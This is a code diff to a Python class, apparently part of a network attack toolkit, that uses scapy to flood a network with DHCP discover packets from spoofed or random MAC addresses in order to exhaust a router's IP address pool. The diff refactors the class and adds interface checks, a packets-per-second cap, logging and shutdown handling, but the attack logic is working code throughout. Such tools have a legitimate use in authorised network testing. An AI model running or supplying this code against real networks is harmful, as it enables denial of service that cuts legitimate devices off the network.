@@ -1,5 +1,6 @@
 import random
 import re
+import logging
 import threading
 import time
 from collections import deque
@@ -10,12 +11,13 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether
 from scapy.packet import Packet
 from scapy.sendrecv import sendp
+from scapy.arch import get_if_list
 
-from .base_attack import BaseAttack
 
-
-class DHCPExhaustion(BaseAttack):
+class DHCPExhaustion:
     """Simulate multiple DHCP clients to exhaust router's IP pool"""
+
+    MAX_PPS: int = 100  # Class-wide safety limit
 
     def __init__(
         self,
@@ -24,21 +26,37 @@ class DHCPExhaustion(BaseAttack):
         request_options: Optional[List[int]] = None,
         client_src: Optional[List[str]] = None,
     ):
-        """
-        Initialize DHCP exhaustion attack
+        self.interface = interface
+        self.running = False
+        self.thread: Optional[threading.Thread] = None
+        self.logger = logging.getLogger(self.__class__.__name__)
+        self._validate_interface()
 
-        :param num_devices: Number of fake devices to simulate
-        """
-        super().__init__(interface)
         if num_devices < 1:
             raise ValueError("Number of devices must be at least 1")
         self.num_devices = num_devices
         self.request_options = request_options or list(range(81))
         self.client_src: List[str] = self._validate_macs(client_src) if client_src else []
-        # Always create a deque, even if empty
         self.mac_pool: deque[str] = deque(self.client_src)
         self.sent_macs: set[str] = set()
         self.lock = threading.Lock()
+
+    def _validate_interface(self) -> None:
+        """Verify network interface exists."""
+        if self.interface not in get_if_list():
+            raise ValueError(
+                f"Interface '{self.interface}' not found. " f"Available interfaces: {get_if_list()}"
+            )
+
+    def _rate_limit(self, pps: int) -> int:
+        """Enforce packets-per-second safety limit."""
+        if pps > self.MAX_PPS:
+            self.logger.warning(
+                f"Requested {pps} pps exceeds safety limit {self.MAX_PPS}. "
+                f"Capping at {self.MAX_PPS} pps."
+            )
+            return self.MAX_PPS
+        return pps
 
     def _validate_macs(self, mac_list: List[str]) -> List[str]:
         """Validate and normalize MAC addresses"""
@@ -51,20 +69,15 @@ class DHCPExhaustion(BaseAttack):
                     f"Invalid MAC #{idx + 1}: '{mac}'\n"
                     "Valid format: '01:23:45:67:89:ab' or '01-23-45-67-89-ab'"
                 )
-            # Normalize to lowercase with colons
-            normalized = mac.lower().replace("-", ":")
-            validated.append(normalized)
-
+            validated.append(mac.lower().replace("-", ":"))
         return validated
 
     def _generate_mac(self) -> str:
         """Generate MAC from pool or randomly"""
         if self.mac_pool:
-            # Cycle through provided MACs
             mac = self.mac_pool[0]
             self.mac_pool.rotate(-1)
             return mac
-        # Fallback to random generation
         while True:
             mac = "de:ad:%02x:%02x:%02x:%02x" % (
                 random.randint(0, 0xFF),
@@ -75,11 +88,6 @@ class DHCPExhaustion(BaseAttack):
             if mac not in self.sent_macs:
                 self.sent_macs.add(mac)
                 return mac
-
-    def _validate_options(self) -> None:
-        """Ensure requested options are valid DHCP option codes"""
-        if not all(0 <= opt <= 255 for opt in self.request_options):
-            raise ValueError("DHCP options must be between 0-255")
 
     def _create_dhcp_packet(self) -> Packet:
         """Build DHCP discovery packet"""
@@ -103,7 +111,7 @@ class DHCPExhaustion(BaseAttack):
         """Main attack loop with rate limiting"""
         try:
             sent_count = 0
-            base_pps = max(1, self.num_devices)  # Ensure at least 1 pps
+            base_pps = max(1, self.num_devices)
             allowed_pps = self._rate_limit(base_pps)
             delay = 1.0 / allowed_pps
 
@@ -111,8 +119,7 @@ class DHCPExhaustion(BaseAttack):
                 pkt = self._create_dhcp_packet()
                 sendp(pkt, iface=self.interface, verbose=False)
                 self.logger.info(
-                    f"Sent DHCP request from {pkt.src}\
-                        ({sent_count+1} / {self.num_devices})"
+                    f"Sent DHCP request from {pkt.src} " f"({sent_count+1}/{self.num_devices})"
                 )
                 sent_count += 1
                 time.sleep(delay)
@@ -136,7 +143,21 @@ class DHCPExhaustion(BaseAttack):
     def stop(self) -> None:
         """Stop attack thread"""
         self.running = False
-        # only join if called from a different thread
-        if self.thread and self.thread.is_alive() and threading.current_thread() is not self.thread:
-            self.thread.join()
+        if self.thread and self.thread.is_alive():
+            if threading.current_thread() is not self.thread:
+                self.thread.join(timeout=5)
+                if self.thread.is_alive():
+                    self.logger.error("DHCP thread failed to stop")
         self.logger.info("DHCP exhaustion stopped")
+
+    def user_abort(self) -> None:
+        """Public method for signal handlers."""
+        self.logger.info("User requested graceful shutdown")
+        self.stop()
+
+    def __enter__(self) -> "DHCPExhaustion":
+        self.start()
+        return self
+
+    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
+        self.stop()
